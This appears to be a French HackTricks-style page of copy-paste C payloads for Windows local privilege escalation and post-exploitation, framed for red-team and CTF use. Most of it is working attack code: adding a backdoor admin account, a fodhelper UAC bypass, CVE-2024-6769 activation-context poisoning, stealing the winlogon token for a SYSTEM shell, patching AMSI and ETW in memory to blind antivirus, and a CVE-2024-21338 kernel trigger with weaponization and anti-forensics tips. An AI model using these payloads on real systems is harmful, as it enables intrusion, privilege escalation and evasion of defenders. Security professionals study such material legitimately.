# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Cette page rassemble des **petits extraits de code C autonomes** utiles lors de Windows Local Privilege Escalation ou de post-exploitation. Chaque payload est conçu pour être **facile à copier-coller**, n'utilise que l'API Windows / le runtime C, et peut être compilé avec `i686-w64-mingw32-gcc` (x86) ou `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Ces payloads supposent que le processus dispose déjà des privilèges minimaux nécessaires pour effectuer l'action (par ex. `SeDebugPrivilege`, `SeImpersonatePrivilege`, ou un contexte à intégrité moyenne pour un UAC bypass). Ils sont destinés aux **red-team ou environnements CTF** où l'exploitation d'une vulnérabilité a permis l'exécution arbitraire de code natif.

---

## Ajouter un utilisateur administrateur local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Quand le binaire de confiance **`fodhelper.exe`** est exécuté, il interroge le chemin du registre ci‑dessous **sans filtrer le verbe `DelegateExecute`**. En plaçant notre commande sous cette clé, un attaquant peut contourner UAC *sans* déposer de fichier sur le disque.

*Chemin de registre interrogé par `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC minimal qui lance un `cmd.exe` élevé :
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testé sur Windows 10 22H2 et Windows 11 23H2 (patchs de juillet 2025). Le contournement fonctionne toujours car Microsoft n'a pas corrigé l'absence de vérification d'intégrité dans le chemin `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Le remappage de lecteur + activation context cache poisoning fonctionne encore contre des builds Windows 10/11 patchées car `ctfmon.exe` s'exécute en tant que processus UI de haute intégrité et de confiance qui charge volontiers depuis le lecteur `C:` usurpé de l'appelant et réutilise les redirections de DLL que `CSRSS` a mises en cache. L'abus se déroule ainsi : pointer `C:` vers un stockage contrôlé par l'attaquant, déposer un `msctf.dll` trojanisé, lancer `ctfmon.exe` pour obtenir une haute intégrité, puis demander à `CSRSS` de mettre en cache un manifest qui redirige une DLL utilisée par un binaire auto-élevé (par ex. `fodhelper.exe`) afin que le lancement suivant hérite de votre payload sans invite UAC.

Flux de travail pratique :
1. Préparez un arbre `%SystemRoot%\System32` factice et copiez le binaire légitime que vous prévoyez de détourner (souvent `ctfmon.exe`).
2. Utilisez `DefineDosDevice(DDD_RAW_TARGET_PATH)` pour remapper `C:` dans votre processus, en conservant `DDD_NO_BROADCAST_SYSTEM` afin que le changement reste local.
3. Déposez votre DLL + manifest dans l'arborescence factice, appelez `CreateActCtx/ActivateActCtx` pour pousser le manifest dans le cache d'activation-context, puis lancez le binaire auto-élevé pour qu'il résolve la DLL redirigée directement vers votre shellcode.
4. Supprimez l'entrée de cache (`sxstrace ClearCache`) ou redémarrez à la fin pour effacer les empreintes de l'attaquant.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Astuce de nettoyage : après avoir obtenu SYSTEM, exécutez `sxstrace Trace -logfile %TEMP%\sxstrace.etl` suivi de `sxstrace Parse` lors des tests — si vous voyez le nom de votre manifeste dans le journal, les défenseurs peuvent aussi le voir, donc changez de chemin à chaque exécution.

---

## Obtenir un shell SYSTEM via la duplication de jeton (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Si le processus courant possède **à la fois** les privilèges `SeDebug` et `SeImpersonate` (typique pour de nombreux comptes de service), vous pouvez voler le token de `winlogon.exe`, le dupliquer et lancer un processus élevé :
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Pour une explication plus approfondie du fonctionnement, voir :

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
La plupart des moteurs AV/EDR modernes s'appuient sur **AMSI** et **ETW** pour inspecter les comportements malveillants. Le patch des deux interfaces, réalisé tôt dans le processus courant, empêche les payloads basés sur des scripts (p. ex. PowerShell, JScript) d'être analysés.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Le correctif ci‑dessus est local au processus ; lancer un nouveau PowerShell après son exécution s'exécutera sans inspection AMSI/ETW.*

---

## Créer un processus enfant en tant que Protected Process Light (PPL)
Demandez un niveau de protection PPL pour un processus enfant au moment de sa création en utilisant `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Il s'agit d'une API documentée et elle ne réussira que si l'image cible est signée pour la classe de signataire demandée (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Niveaux utilisés le plus couramment :
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Validez le résultat avec Process Explorer/Process Hacker en vérifiant la colonne Protection.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` expose un objet de périphérique (`\\.\\AppID`) dont l'IOCTL de maintenance du smart-hash accepte des pointeurs de fonction fournis par l'utilisateur lorsque l'appelant s'exécute en tant que `LOCAL SERVICE` ; Lazarus abuse de cela pour désactiver PPL et charger des drivers arbitraires, donc les red teams devraient avoir un déclencheur prêt pour un usage en laboratoire.

Notes opérationnelles :
- Vous avez toujours besoin d'un jeton `LOCAL SERVICE`. Volez-le depuis `Schedule` ou `WdiServiceHost` en utilisant `SeImpersonatePrivilege`, puis effectuez une impersonation avant d'accéder au périphérique afin que les vérifications ACL passent.
- L'IOCTL `0x22A018` attend une struct contenant deux pointeurs de callback (query length + read function). Pointez les deux vers des stubs user-mode qui construisent un overwrite de token ou mappent des primitives ring-0, mais gardez les buffers RWX pour que KernelPatchGuard ne plante pas en plein enchaînement.
- Après réussite, sortez de l'impersonation et restaurez le handle du périphérique ; les défenseurs recherchent maintenant des handles `Device\\AppID` inattendus, donc fermez-le immédiatement une fois le privilège obtenu.

<details>
<summary>C - Exemple de déclencheur pour l'abus du smart-hash `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Correction minimale pour une weaponized build : mappez une section RWX avec `VirtualAlloc`, copiez votre token duplication stub dans celle-ci, définissez `KernelThunk = section`, et une fois que `DeviceIoControl` retourne vous devriez être SYSTEM même sous PPL.

---

## Références
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – lanceur de processus PPL minimal : https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
